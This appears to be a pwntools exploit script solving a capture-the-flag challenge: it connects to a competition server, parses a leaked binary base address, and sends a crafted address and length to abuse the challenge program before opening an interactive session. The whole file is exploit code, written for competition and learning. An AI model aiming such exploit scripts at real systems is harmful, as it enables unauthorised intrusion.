from pwn import *

context.binary = exe = ELF('./chal')
libc = ELF('./libc.so.6')

#io = process()
#gdb.attach(io, api=True)
io = remote('wfw1.2023.ctfcompetition.com', 1337)

io.recvuntil(b'shot.\n')
exe.address = int(io.recvuntil(b'-')[:-1], 16)

first_str = exe.address + 0x21e0

io.recvuntil(b'expire\n')
payload = f'{hex(first_str)} 127'.encode()
io.sendline(payload)

io.interactive()